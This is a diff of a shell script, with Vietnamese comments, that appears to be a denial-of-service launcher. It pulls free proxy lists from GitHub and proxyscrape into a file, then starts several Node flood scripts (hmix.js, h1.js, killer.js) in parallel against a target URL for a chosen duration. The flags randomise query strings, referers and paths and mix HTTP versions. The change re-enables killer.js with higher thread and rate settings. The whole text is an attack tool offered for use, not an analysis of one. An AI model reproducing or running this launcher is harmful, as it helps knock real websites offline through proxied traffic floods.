@@ -11,16 +11,16 @@ TIME=$2
 for t in http; do
 curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$t/Vietnam.txt" >> live.txt
 echo >> live.txt  # xuống dòng sau lần 1
-curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=1000&protocol=$t" >> live.txt
+curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=2000&protocol=$t" >> live.txt
 done
 wait
 
 
 # Chạy các script node
-for m in POST GET; do
+for m in GET; do
   node hmix.js -m $m -u $URL -s $TIME -p live.txt --full true -d false &
   node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
-  #node killer.js $m $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
+  node killer.js $m $URL $TIME 4 64 live.txt --query 1 --referer rand --http mix --close --parsed --reset &
 done
 
 wait
